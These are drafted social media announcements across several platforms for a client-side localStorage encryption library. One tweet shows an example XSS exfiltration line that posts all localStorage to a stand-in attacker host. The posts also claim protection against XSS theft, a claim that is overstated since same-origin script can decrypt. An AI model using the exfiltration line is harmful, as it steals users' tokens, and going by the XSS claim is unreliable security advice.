# Social Media Content

## LinkedIn Post (Professional)

```
🔐 Your localStorage is storing sensitive data in plain text

I just published @bantis/local-cipher v2.0 - a client-side encryption library for browser storage.

The problem:
• localStorage stores everything in plain text
• Anyone with DevTools can read your tokens
• XSS attacks can steal all data
• Malware can extract from disk

The solution:
• AES-256-GCM encryption with browser fingerprinting
• Drop-in replacement for localStorage
• Auto-expiration, event monitoring, namespaces
• Full TypeScript support

Before:
localStorage: { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }

After:
localStorage: { "__enc_a7f5d8e2": "Qm9keUVuY3J5cHRlZERhdGE..." }

Installation:
npm install @bantis/local-cipher

Example:
```typescript
import { SecureStorage } from '@bantis/local-cipher';

const storage = SecureStorage.getInstance();
await storage.setItem('token', jwt);
const token = await storage.getItem('token');
```

React hooks and Angular service included.

This doesn't replace HTTPS or proper authentication, but it adds a critical defense layer against XSS and local file access.

npm: https://www.npmjs.com/package/@bantis/local-cipher
GitHub: https://github.com/master-tech-team/-bantis-local-cipher

#WebSecurity #JavaScript #TypeScript #WebDev #Encryption #OpenSource
```

---

## X/Twitter Thread

**Tweet 1:**
```
🔐 Your localStorage is a security risk

Every web app stores tokens, API keys, and user data in plain text. Anyone with DevTools can read it.

I built @bantis/local-cipher to fix this. Here's how it works 🧵
```

**Tweet 2:**
```
The problem:

Open DevTools → Application → Local Storage

You'll see:
• accessToken: "eyJhbGci..."
• user: '{"email":"user@example.com"}'
• apiKey: "sk_live_..."

All readable. All stealable.
```

**Tweet 3:**
```
Real risks:

1. XSS attacks → `fetch('attacker.com', {body: localStorage})`
2. Malicious extensions → silent data theft
3. Physical access → copy browser files
4. Shared computers → data persists

One vulnerability = game over
```

**Tweet 4:**
```
The solution: Client-side encryption

Before:
localStorage: { "token": "eyJhbGci..." }

After:
localStorage: { "__enc_a7f5": "Qm9keU..." }

AES-256-GCM encryption with browser fingerprinting
```

**Tweet 5:**
```
Drop-in replacement for localStorage:

```typescript
import { SecureStorage } from '@bantis/local-cipher';

const storage = SecureStorage.getInstance();

await storage.setItem('token', jwt);
const token = await storage.getItem('token');
```

Just add 'await'. That's it.
```

**Tweet 6:**
```
Features:

✅ AES-256-GCM encryption
✅ Auto-expiration (TTL)
✅ Event monitoring
✅ Namespaces
✅ Integrity checks
✅ React hooks
✅ Angular service
✅ TypeScript

npm install @bantis/local-cipher
```

**Tweet 7:**
```
What it protects:
✅ XSS data theft
✅ Local file access
✅ DevTools inspection

What it doesn't:
❌ Server attacks
❌ MITM (use HTTPS)
❌ Compromised browser

It's a defense layer, not a silver bullet.
```

**Tweet 8:**
```
Performance: ~3ms per operation

Negligible for most apps. Security is worth it.

npm: https://www.npmjs.com/package/@bantis/local-cipher
GitHub: https://github.com/master-tech-team/-bantis-local-cipher

Open source, MIT licensed. Contributions welcome 🚀
```

---

## Reddit Post (r/javascript, r/webdev)

**Title:** I built a client-side encryption library for localStorage (AES-256-GCM)

**Body:**
```
Hey r/javascript,

I just released v2.0 of @bantis/local-cipher - a library that encrypts localStorage data transparently.

## The Problem

localStorage stores everything in plain text. Open DevTools right now and check Application → Local Storage. You'll probably see tokens, API keys, and user data - all readable.

This is a security risk:
- XSS attacks can steal all data with one line of code
- Malicious browser extensions can exfiltrate silently
- Physical access to the computer exposes everything
- Malware can extract data from browser files

## The Solution

Encrypt data before storing it. Even if someone accesses localStorage, they get encrypted gibberish.

```javascript
import { SecureStorage } from '@bantis/local-cipher';

const storage = SecureStorage.getInstance();

// Store encrypted
await storage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// Retrieve decrypted
const token = await storage.getItem('token');
```

## How It Works

1. Browser fingerprinting generates unique key per device
2. PBKDF2 derives AES-256 key (100k iterations)
3. AES-256-GCM encrypts data with random IV
4. Encrypted data stored in localStorage
5. Automatic decryption on retrieval

## Features

- AES-256-GCM encryption (NIST-approved)
- Auto-expiration with TTL
- Event system (monitor encrypted, expired, error events)
- Namespaces for data organization
- Integrity validation (SHA-256 checksums)
- Key rotation
- React hooks
- Angular service
- Full TypeScript support

## Performance

~3ms per operation. Negligible for most apps.

## What It Protects Against

✅ XSS data theft (encrypted data is useless)
✅ Local file access (malware gets encrypted data)
✅ DevTools inspection (only encrypted values visible)

## What It Doesn't Protect Against

❌ Server-side attacks (client-side only)
❌ MITM (use HTTPS)
❌ Memory dumps (keys in memory during runtime)
❌ Compromised browser

## Installation

```bash
npm install @bantis/local-cipher
```

## Links

- npm: https://www.npmjs.com/package/@bantis/local-cipher
- GitHub: https://github.com/master-tech-team/-bantis-local-cipher
- Docs: Full README with examples

Open source, MIT licensed. Feedback and contributions welcome!

Let me know if you have questions about the implementation or use cases.
```

---

## Hacker News Post

**Title:** Show HN: Client-side encryption for localStorage (AES-256-GCM)

**Body:**
```
I built a library that encrypts localStorage transparently using AES-256-GCM and browser fingerprinting.

The problem: localStorage stores data in plain text. Anyone with DevTools, malicious extensions, or XSS vulnerabilities can read tokens, API keys, and user data.

The solution: Encrypt before storing. Drop-in replacement for localStorage with automatic encryption/decryption.

```javascript
import { SecureStorage } from '@bantis/local-cipher';
const storage = SecureStorage.getInstance();

await storage.setItem('token', jwt);
const token = await storage.getItem('token');
```

Technical details:
- AES-256-GCM with authentication
- PBKDF2 key derivation (100k iterations)
- Browser fingerprinting for unique keys
- SHA-256 integrity checks
- ~3ms overhead per operation

Features:
- TTL/expiration
- Event system
- Namespaces
- Key rotation
- React/Angular integrations
- TypeScript

What it protects: XSS data theft, local file access, casual inspection
What it doesn't: Server attacks, MITM (use HTTPS), memory dumps

npm: https://www.npmjs.com/package/@bantis/local-cipher
GitHub: https://github.com/master-tech-team/-bantis-local-cipher

Open source, MIT licensed. Built with TypeScript, 80%+ test coverage.

Happy to answer questions about the crypto implementation or use cases.
```

---

## Dev.to Post Tags

```
#javascript #typescript #security #encryption #webdev #opensource #react #angular #localstorage #crypto
```

---

## GitHub Repository Topics

```
encryption
localstorage
security
aes-256-gcm
typescript
react
angular
web-crypto-api
client-side-encryption
browser-storage
pbkdf2
javascript-library
frontend-security
xss-protection
data-encryption
```
